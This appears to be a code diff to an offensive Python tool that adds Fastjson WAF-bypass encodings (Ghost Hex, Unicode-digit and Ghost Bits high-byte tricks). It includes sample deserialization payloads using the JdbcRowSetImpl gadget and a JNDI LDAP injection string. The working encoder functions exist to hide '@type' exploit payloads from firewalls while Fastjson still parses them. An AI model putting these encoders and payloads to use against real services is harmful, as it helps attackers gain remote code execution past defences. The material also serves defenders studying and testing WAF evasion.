@@ -1,4 +1,4 @@
-"""Fastjson WAF 绕过变换（unicode/hex、多逗号、key _/-、填充等）。"""
+"""Fastjson WAF 绕过变换（unicode/hex、Ghost Bits、多逗号、key _/-、填充等）。"""
 
 from __future__ import annotations
 
@@ -73,6 +73,35 @@ TECHNIQUES: list[WafTechniqueInfo] = [
         description="对字符串 value 中的特殊字符做百分号编码（如 ${} → %7b%7d）",
         notes=[
             r'dataSourceName":"$%7bjndi:ldap://...%7d"',
+        ],
+    ),
+    WafTechniqueInfo(
+        id="hex_ghost",
+        title=r"Ghost Hex \x4_",
+        description=r"利用 Fastjson digits[] 对非法 hex 默认 0：\x4_ → @（WAF 看不到 @type）",
+        notes=[
+            r'{"\x4_type":"com.sun.rowset.JdbcRowSetImpl",...}',
+            "仅零半字节可换成非 hex 填充符（_/J/G…，码点 <103）",
+            "Black Hat Asia 2026 Ghost Bits / Cast Attack — Fastjson \\x 面",
+        ],
+    ),
+    WafTechniqueInfo(
+        id="unicode_digit",
+        title="Ghost Unicode 数字",
+        description=r"\uXXXX 的 hex 位用全角/泰文等 Unicode 数字；Character.digit 仍认作 hex",
+        notes=[
+            r"\u００４０ → @（全角 ０/４）",
+            "可选 script：fullwidth / thai / gurmukhi",
+            "Black Hat Asia 2026 — Fastjson \\u + Character.digit 宽松解析",
+        ],
+    ),
+    WafTechniqueInfo(
+        id="ghost_bits",
+        title="Ghost Bits 高位嵌入",
+        description="将 ASCII 换成低 8 位相同、高位非零的 Unicode（char→byte 截断场景）",
+        notes=[
+            r"ghost(T,k)=chr((k<<8)|T)；@ → ŀ(U+0140) 等",
+            "适用于 Tomcat/Spring/Jackson 等截断 sink；Fastjson Autotype 优先用 hex_ghost / unicode_digit",
         ],
     ),
 ]
@@ -184,6 +213,83 @@ def _encode_unicode_plus(s: str) -> str:
     return "".join(out)
 
 
+# Ghost Bits / Cast Attack（Black Hat Asia 2026）相关编码
+_HEX_NIBBLE = "0123456789abcdef"
+_DIGIT_SCRIPTS: dict[str, str] = {
+    # ASCII 0-9 → 各文字数字（Character.digit(ch, 16) 仍返回 0-9）
+    "fullwidth": "０１２３４５６７８９",
+    "thai": "๐๑๒๓๔๕๖๗๘๙",
+    "gurmukhi": "੦੧੨੩੪੫੬੭੮੯",
+}
+
+
+def _hex_ghost_filler(opts: WafOptions) -> str:
+    filler = (opts.hex_ghost_filler or "_")[:1]
+    code = ord(filler)
+    if code >= 103 or filler in "0123456789abcdefABCDEF":
+        raise ValueError(
+            "hex_ghost_filler 须为非 hex 且码点 <103（Fastjson digits 表长度），"
+            f"当前 {filler!r} (U+{code:04X})"
+        )
+    return filler
+
+
+def _encode_hex_ghost(s: str, *, filler: str) -> str:
+    """Fastjson \\x：digits[x]*16+digits[y]；非 hex 槽位为 0，故 \\x4_ → '@'。"""
+    out: list[str] = []
+    for c in s:
+        code = ord(c)
+        if code > 0xFF:
+            out.append(f"\\u{code:04x}")
+            continue
+        hi, lo = (code >> 4) & 0xF, code & 0xF
+        h = filler if hi == 0 else _HEX_NIBBLE[hi]
+        l = filler if lo == 0 else _HEX_NIBBLE[lo]
+        out.append(f"\\x{h}{l}")
+    return "".join(out)
+
+
+def _map_hex_digits(hx: str, script: str) -> str:
+    digits = _DIGIT_SCRIPTS.get(script) or _DIGIT_SCRIPTS["fullwidth"]
+    table = str.maketrans("0123456789", digits)
+    # a-f 保持 ASCII（全角拉丁字母不一定被 Character.digit 接受）
+    return hx.translate(table)
+
+
+def _encode_unicode_digit(s: str, *, script: str) -> str:
+    """\\uXXXX 但 0-9 换成 Unicode 数字字形。"""
+    if script not in _DIGIT_SCRIPTS:
+        known = ", ".join(_DIGIT_SCRIPTS)
+        raise ValueError(f"未知 unicode_digit_script: {script}；可选: {known}")
+    out: list[str] = []
+    for c in s:
+        hx = f"{ord(c):04x}"
+        out.append(f"\\u{_map_hex_digits(hx, script)}")
+    return "".join(out)
+
+
+def _ghost_char(target_byte: int, k: int) -> str:
+    """返回低 8 位等于 target_byte 的 BMP 字符；避开代理区高字节。"""
+    k = k & 0xFF
+    if 0xD8 <= k <= 0xDF:
+        k = 0x01
+    if k == 0:
+        k = 0x01
+    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))
+
+
+def _encode_ghost_bits(s: str, *, k: int) -> str:
+    """经典 Ghost Bits：WAF 见 Unicode，截断 sink 见 ASCII。"""
+    out: list[str] = []
+    for c in s:
+        code = ord(c)
+        if code > 0xFF:
+            out.append(c)
+            continue
+        out.append(_ghost_char(code, k))
+    return "".join(out)
+
+
 def _should_touch_key(raw_key: str, opts: WafOptions, *, for_sep: bool) -> bool:
     if for_sep:
         targets = opts.key_targets
@@ -282,8 +388,20 @@ def apply_encode(
     *,
     style: str,
 ) -> str:
-    if style not in {"unicode", "hex", "unicode_hex", "unicode_plus"}:
+    if style not in {
+        "unicode",
+        "hex",
+        "unicode_hex",
+        "unicode_plus",
+        "hex_ghost",
+        "unicode_digit",
+        "ghost_bits",
+    }:
         raise ValueError(f"unknown encode style: {style}")
+
+    filler = _hex_ghost_filler(opts) if style == "hex_ghost" else "_"
+    script = (opts.unicode_digit_script or "fullwidth").strip().lower()
+    ghost_k = opts.ghost_k
 
     def _enc(raw: str, *, as_key: bool) -> str:
         if style == "unicode":
@@ -292,6 +410,12 @@ def apply_encode(
             return _encode_hex(raw)
         if style == "unicode_plus":
             return _encode_unicode_plus(raw)
+        if style == "hex_ghost":
+            return _encode_hex_ghost(raw, filler=filler)
+        if style == "unicode_digit":
+            return _encode_unicode_digit(raw, script=script)
+        if style == "ghost_bits":
+            return _encode_ghost_bits(raw, k=ghost_k)
         return _encode_unicode_hex_mix(raw, as_key=as_key)
 
     def key_fn(content: str, raw_key: str) -> str | None:
@@ -463,6 +587,9 @@ _APPLY: dict[str, Callable[[str, WafOptions], str]] = {
     "hex": lambda t, o: apply_encode(t, o, style="hex"),
     "unicode_hex": lambda t, o: apply_encode(t, o, style="unicode_hex"),
     "unicode_plus": lambda t, o: apply_encode(t, o, style="unicode_plus"),
+    "hex_ghost": lambda t, o: apply_encode(t, o, style="hex_ghost"),
+    "unicode_digit": lambda t, o: apply_encode(t, o, style="unicode_digit"),
+    "ghost_bits": lambda t, o: apply_encode(t, o, style="ghost_bits"),
     "multi_comma": apply_multi_comma,
     "key_underscore": lambda t, o: apply_key_sep(t, o, style="underscore"),
     "key_hyphen": lambda t, o: apply_key_sep(t, o, style="hyphen"),
